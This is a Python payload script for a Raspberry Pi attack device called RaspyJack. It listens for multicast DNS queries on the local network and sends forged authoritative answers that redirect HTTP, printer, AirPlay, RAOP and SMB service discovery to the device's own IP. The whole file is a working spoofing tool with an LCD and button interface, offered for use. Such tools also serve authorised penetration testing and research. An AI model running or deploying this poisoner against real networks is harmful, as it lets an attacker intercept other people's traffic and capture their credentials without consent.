#!/usr/bin/env python3
"""
RaspyJack Payload -- mDNS/DNS-SD Poisoner
==========================================
Author: 7h30th3r0n3

Listens on 224.0.0.251:5353 for mDNS queries and responds with
spoofed answers pointing to the Pi's IP.  Targets common service
discovery types (_http, _ipp, _airplay, _raop, _smb).

Controls:
  OK         -- Start / Stop poisoning
  KEY1       -- Toggle which services to spoof
  UP / DOWN  -- Scroll service list
  KEY3       -- Exit
"""

import os
import sys
import time
import socket
import struct
import threading
import subprocess

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

try:
    from scapy.all import (
        IP, UDP, DNS, DNSQR, DNSRR, DNSRROPT,
        send, sniff as scapy_sniff, conf,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT

MDNS_ADDR = "224.0.0.251"
MDNS_PORT = 5353

# Services we can spoof
SERVICES = [
    {"name": "_http._tcp.local.", "label": "HTTP", "enabled": True},
    {"name": "_ipp._tcp.local.", "label": "Printer", "enabled": True},
    {"name": "_airplay._tcp.local.", "label": "AirPlay", "enabled": True},
    {"name": "_raop._tcp.local.", "label": "RAOP", "enabled": True},
    {"name": "_smb._tcp.local.", "label": "SMB", "enabled": True},
]

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
running = False
queries_seen = 0
responses_sent = 0
scroll = 0
my_ip = "0.0.0.0"

# Deep-copy services into mutable state
service_state = [dict(s) for s in SERVICES]

# ---------------------------------------------------------------------------
# IP detection
# ---------------------------------------------------------------------------

def _get_local_ip():
    """Get the Pi's local IP address."""
    try:
        result = subprocess.run(
            ["hostname", "-I"],
            capture_output=True, text=True, timeout=5,
        )
        ips = result.stdout.strip().split()
        for ip in ips:
            if ip.startswith("192.") or ip.startswith("10.") or ip.startswith("172."):
                return ip
        if ips:
            return ips[0]
    except Exception:
        pass
    # Fallback: connect to multicast and read local address
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("224.0.0.251", 5353))
        addr = s.getsockname()[0]
        s.close()
        return addr
    except Exception:
        pass
    return "0.0.0.0"

# ---------------------------------------------------------------------------
# mDNS response crafting (scapy)
# ---------------------------------------------------------------------------

def _enabled_service_names():
    """Return set of enabled service query names."""
    with lock:
        return {s["name"] for s in service_state if s["enabled"]}


def _craft_mdns_response(qname, spoofed_ip):
    """Build an mDNS response packet for the given query name."""
    pkt = (
        IP(dst=MDNS_ADDR, ttl=255)
        / UDP(sport=MDNS_PORT, dport=MDNS_PORT)
        / DNS(
            qr=1,  # response
            aa=1,  # authoritative
            rd=0,
            qd=None,
            an=DNSRR(
                rrname=qname,
                type="PTR",
                rclass=0x8001,  # cache flush + IN
                ttl=120,
                rdata=f"RaspyJack.{qname}",
            ),
            ar=DNSRR(
                rrname=f"RaspyJack.{qname.split('.', 1)[1] if '.' in qname else qname}",
                type="A",
                rclass=0x8001,
                ttl=120,
                rdata=spoofed_ip,
            ),
        )
    )
    return pkt

# ---------------------------------------------------------------------------
# Listener thread
# ---------------------------------------------------------------------------

def _listener_thread():
    """Listen for mDNS queries and send spoofed responses."""
    global queries_seen, responses_sent

    if not SCAPY_OK:
        return

    def _handle_pkt(pkt):
        global queries_seen, responses_sent

        if not running:
            return
        if not pkt.haslayer(DNS):
            return
        dns = pkt[DNS]
        if dns.qr != 0:  # not a query
            return
        if not dns.qd:
            return

        enabled = _enabled_service_names()
        qname = dns.qd.qname.decode("utf-8", errors="ignore") if isinstance(
            dns.qd.qname, bytes) else str(dns.qd.qname)

        with lock:
            queries_seen += 1

        # Check if any enabled service matches
        matched = False
        for svc_name in enabled:
            if svc_name in qname or qname in svc_name:
                matched = True
                break

        if not matched:
            return

        # Send spoofed response
        try:
            resp = _craft_mdns_response(qname, my_ip)
            send(resp, verbose=False)
            with lock:
                responses_sent += 1
        except Exception:
            pass

    try:
        scapy_sniff(
            filter=f"udp port {MDNS_PORT}",
            prn=_handle_pkt,
            stop_filter=lambda _: not running,
            store=0,
        )
    except Exception:
        pass

# ---------------------------------------------------------------------------
# Display
# ---------------------------------------------------------------------------

def _draw_frame(lcd, font):
    """Render current state to the LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    # Header
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "mDNS POISON", font=font, fill="#FF00FF")
    d.ellipse((118, 3, 122, 7), fill="#FF00FF" if running else "#444")

    with lock:
        q = queries_seen
        r = responses_sent

    d.text((4, 18), f"IP: {my_ip}", font=font, fill="#AAAAAA")
    d.text((4, 30), f"Queries: {q}  Sent: {r}", font=font, fill="#CCCCCC")

    # Service list
    d.text((4, 44), "Services:", font=font, fill="#888")
    with lock:
        svc_snapshot = [dict(s) for s in service_state]

    visible = svc_snapshot[scroll:scroll + 5]
    for i, svc in enumerate(visible):
        y = 56 + i * ROW_H
        status = "[ON] " if svc["enabled"] else "[OFF]"
        color = "#00FF00" if svc["enabled"] else "#FF4444"
        d.text((4, y), f"{status} {svc['label']}", font=font, fill=color)

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    status = "OK:Stop" if running else "OK:Start"
    d.text((2, 117), f"{status} K1:Tog K3:Quit", font=font, fill="#888")

    lcd.LCD_ShowImage(img, 0, 0)


ROW_H = 12

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global running, scroll, my_ip

    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()
    font = scaled_font()

    if not SCAPY_OK:
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((4, 50), "scapy not found!", font=font, fill="#FF0000")
        d.text((4, 65), "pip install scapy", font=font, fill="#888")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    my_ip = _get_local_ip()

    # Splash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((8, 20), "mDNS POISONER", font=font, fill="#FF00FF")
    d.text((4, 40), "Spoof local services", font=font, fill="#888")
    d.text((4, 58), f"My IP: {my_ip}", font=font, fill="#666")
    d.text((4, 72), "OK    Start / Stop", font=font, fill="#666")
    d.text((4, 84), "KEY1  Toggle service", font=font, fill="#666")
    d.text((4, 96), "KEY3  Exit", font=font, fill="#666")
    lcd.LCD_ShowImage(img, 0, 0)
    time.sleep(1.5)

    try:
        while True:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                break

            elif btn == "OK":
                if running:
                    running = False
                    time.sleep(0.5)
                else:
                    my_ip = _get_local_ip()
                    running = True
                    threading.Thread(
                        target=_listener_thread, daemon=True
                    ).start()
                time.sleep(0.3)

            elif btn == "KEY1":
                # Toggle the currently scrolled-to service
                with lock:
                    if scroll < len(service_state):
                        svc = service_state[scroll]
                        # Create new dict to maintain immutability pattern
                        updated = dict(svc)
                        updated["enabled"] = not svc["enabled"]
                        service_state[scroll] = updated
                time.sleep(0.3)

            elif btn == "UP":
                scroll = max(0, scroll - 1)
                time.sleep(0.15)

            elif btn == "DOWN":
                with lock:
                    max_scroll = max(0, len(service_state) - 1)
                scroll = min(scroll + 1, max_scroll)
                time.sleep(0.15)

            _draw_frame(lcd, font)
            time.sleep(0.05)

    finally:
        running = False
        time.sleep(0.3)
        try:
            lcd.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
